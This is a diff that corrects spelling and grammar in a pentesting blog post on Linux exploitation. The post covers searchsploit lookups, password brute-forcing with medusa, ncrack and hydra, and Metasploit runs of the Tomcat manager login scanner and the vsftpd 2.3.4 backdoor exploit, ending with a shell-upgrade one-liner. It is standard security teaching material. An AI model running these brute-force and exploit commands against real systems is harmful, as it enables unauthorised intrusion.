@@ -8,7 +8,7 @@ tags:
   - Linux Exploitation
 comments: true
 ---
-## Approaches to Linux Expoitation
+## Approaches to Linux Exploitation
 
 
 ## Introduction 
@@ -16,12 +16,12 @@ comments: true
 **_In this blog post we will look for various approaches to exploit linux target and get remote access._**
 
 
-**After identifying vulnerabilities, now we will exploi them to access target remotely**
+**After identifying vulnerabilities, now we will exploit them to access target remotely**
 
-The basic approaches to exploit target network:
+The basic approaches to exploit the target network:
 
 
-* What services's are running in target network?
+* What services are running in the target network?
 
 * What's the version of running services?
 
@@ -31,13 +31,13 @@ The basic approaches to exploit target network:
 
 * Had we found any potential vulnerability in our previous phases?  
 
-* Any sensitive infromation we found?
+* Any sensitive information we found?
 
 * Any credentials we found in previous phases?
 
-* Any web app vulnerability to get system level access
+* Any web app vulnerability to get system-level access
 
-* Is website also has admin panel/dashboard or any service are running, are exploitabe ?
+* Is the website also has admin panel/dashboard or any service are running, are exploitable?
 
 _**There may be soo more approaches, depends on the skills of pentester**_
 
@@ -45,9 +45,9 @@ _**There may be soo more approaches, depends on the skills of pentester**_
 **Searchsploit**
 
 
-Searchsploit is used to find exploits of any exploitable network servicec, web services on target network.
+Searchsploit is used to find exploits of any exploitable network services, web services on the target network.
 
-It Allows to search through exploits and shellcodes using one or more terms from Exploit-DB
+It Allows searching through exploits and shellcodes using one or more terms from Exploit-DB
 
 
 **Installing Searchsploit**
@@ -56,13 +56,13 @@ It Allows to search through exploits and shellcodes using one or more terms from
 # apt update && apt -y install exploitdb
 ```
 
-After install you can easily use it
+After install, you can easily use it
 
 ```
-searchsploit linux kernel 3.2
+searchsploit Linux kernel 3.2
 ```
 
-Let's use it to find exploit for linux kernal
+Let's use it to find exploit for linux kernel
 
 ```
 $ searchsploit linux kernel 4. | head
@@ -78,7 +78,7 @@ Linux Kernel (Debian 9/10 / Ubuntu 14.04.5/16 | linux_x86/local/42276.c
 Linux Kernel (PonyOS 4.0) - 'fluttershy' LD_L | linux/local/41875.py
 ```
 
-Suppose target is running apache 5.3, let's check available exploit for this service
+Suppose target is running Apache 5.3, let's check available exploit for this service
 
 ```
 $ searchsploit apache 5.3| head
@@ -94,7 +94,7 @@ Apache Tomcat < 5.5.17 - Remote Directory Lis | multiple/remote/2061.txt
 Apache Tomcat < 6.0.18 - 'utf8' Directory Tra | multiple/remote/6229.txt
 ```
 
-To find the url for exploit, simply use -w.
+To find the URL for the exploit, simply use -w.
 
 ```
 $searchsploit -w apache 5.3| head
@@ -110,13 +110,13 @@ Apache Tomcat < 5.5.17 - Remote Di | https://www.exploit-db.com/exploits/2061
 Apache Tomcat < 6.0.18 - 'utf8' Di | https://www.exploit-db.com/exploits/14489
 ```
 
-**Like this you can easily find exploits to a particular vulnerabilty, and these exploits are also available with POC's that helps
+**Like this you can easily find exploits to a particular vulnerability, and these exploits are also available with POC's that helps
 you step by step to execute exploits against target**
 
 
 **Exploiting Lower Hanging Fruits**
 
-Lower Hanging Fruits(LHF) exploitation is the process to leaverage your previous phases findings to exploit target system.
+Lower Hanging Fruits(LHF) exploitation is the process to leverage your previous phases' findings to exploit the target system.
 
 This approach is also save's time and efforts of pentesters.
 
@@ -137,12 +137,12 @@ Lower hanging fruits, Means:
 * Etc.
 
 
-We have learnt some of them previously if you remember, this is right time to recall them.
+We have learned some of them previously if you remember, this is the right time to recall them.
 
 
 **Using Medusa to Exploit LHF**
 
-Medusa is intended to be a speedy, massively parallel,  modular,  login brute-forcer.   The goal is to support as many services which allow remote authentication as possible.
+Medusa is intended to be a speedy, massively parallel,  modular,  login brute-forcer.   The goal is to support as many services that allow remote authentication as possible.
 
 
 Read medusa manual 
@@ -150,7 +150,7 @@ Read medusa manual
 ```
 $ man medusa
 ```
-To see usage of medusa
+To see the usage of medusa
 
 ```
 $ medusa -h
@@ -161,14 +161,14 @@ To list available modules of medusa
 ```
 $ medusa -d
 ```
-You can see there are many modules, but if you want know about a specific module
+You can see there are many modules, but if you want to know about a specific module
 
 ```
 $ medusa -M ftp -q
 ```
 It will tell you all about ftp modules
 
-To exploit target using medusa first we need to have wordlist which we can generate using cewl/cupp tools, or we can manually guess namining convention from target services, run web applications.
+To exploit target using medusa first we need to have wordlist which we can generate using cewl/cupp tools, or we can manually guess naming convention from target services, run web applications.
 
 Basic usage of medusa
 
@@ -178,7 +178,7 @@ $ medusa -h <targetIp> -M ftp -U usernames.txt -P passwords.txt
 
 **Ncrack**
 
-Ncrack is designed for companies and security professionals to audit large networks for default or weak passwords in a rapid and reliable way. It can also be used to conduct fairly sophisticated and intensive brute force attacks against individual services.
+Ncrack is designed for companies and security professionals to audit large networks for default or weak passwords rapidly and reliably. It can also be used to conduct fairly sophisticated and intensive brute force attacks against individual services.
 
 Ncrack also has its wordlists available, to check:
 
@@ -229,7 +229,7 @@ ncrack ssh 10.10.10.135
 we can also specify the port 
 
 ```
-ncrack ssh ssh://10.10.10.135:187     // Suppose ssh is running on port 187
+ncrack ssh://10.10.10.135:187     // Suppose ssh is running on port 187
 ```
 
 **Using hydra to exploit weak passwords**
@@ -253,19 +253,19 @@ hydra -L users.txt -P passwords.txt ssh://10.10.10.135
 
 ## Exploitation
 
-The process of taking adavantage of target vulnerabilties to get remote access in target system and leaverage access to perform malicious action in target system.
+The process of taking advantage of target vulnerabilities to get remote access in the target system and leverage access to perform malicious activities in the target system.
 
 
-Having found vulnerabilities in target system now proceed to to exploit them.
+Having found vulnerabilities in the target system now proceed to exploit them.
 
 
-Using Metasploit to exploit target vulnerability and get meterpreter shell.
+Using Metasploit to exploit target vulnerability and get a meterpreter shell.
 
 
 **Using previous findings now we will exploit them in metasploit**
 
 
-Suppose you found that target is running apache tomcat 5.5 server.
+Suppose you found that the target is running apache tomcat 5.5 server. 
 
 Search for exploit available on exploit-db
 
@@ -289,7 +289,7 @@ You have two choices you can directly download exploit from exploit db and execu
 
 Or use metasploit to do this task for you.
 
-First start from password guessing as its a low hanging fruit.
+First, start from password guessing as to its a low hanging fruit.
 
 ```
 # msfconsole
@@ -311,7 +311,7 @@ Matching Modules
 msf5 > use auxiliary/scanner/http/tomcat_mgr_login
 msf5 auxiliary(scanner/http/tomcat_mgr_login) > 
 ```
-Using 'show option' command we can see required options to set.
+Using the 'show option' command we can see the required options to set.
 
 ```
 msf5 auxiliary(scanner/http/tomcat_mgr_login) > set rhost 10.10.10.150
@@ -328,11 +328,11 @@ ssl => true
 msf5 auxiliary(scanner/http/tomcat_mgr_login) > run
 ```
 
-This will run and give us desired result.
+This will run and give us the desired result.
 
-After getting credentials you can login apache tomcat manager and will be able to perform malicious actions.
+After getting credentials you can log in apache tomcat manager and will be able to perform malicious actions.
 
-We can also use previos techniques.
+We can also use previous techniques.
 
 **Exploit FTP v2.3.4 server using metasplolit**
 
@@ -380,11 +380,11 @@ Simple use run/exploit command
 msf5 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
 ```
 
-And it will execute and if successful give you meterpreter shell
+And it will execute and if successful gives you meterpreter shell
 
 In condition to get proper target shell use 'shell' command in meterpreter.
 
-And suppose if you dont have proper tty shell you can use python one liner to get TTY shell
+And suppose if you don't have proper tty shell you can use python one-liner to get TTY shell
 
 ```
 python -c 'import pty; pty.spawn("/bin/sh")'
@@ -395,7 +395,7 @@ python -c 'import pty; pty.spawn("/bin/sh")'
 
 ## Conclusion
 
-**_In this blogpost we have learnt some basic approaches to exploit target, you can use some of these approaches in windows target also, like lower hanging fruit._**
+**_In this blog post we have learned some basic approaches to exploit target, you can use some of these approaches in windows target also, like lower hanging fruit._**
 
 
 
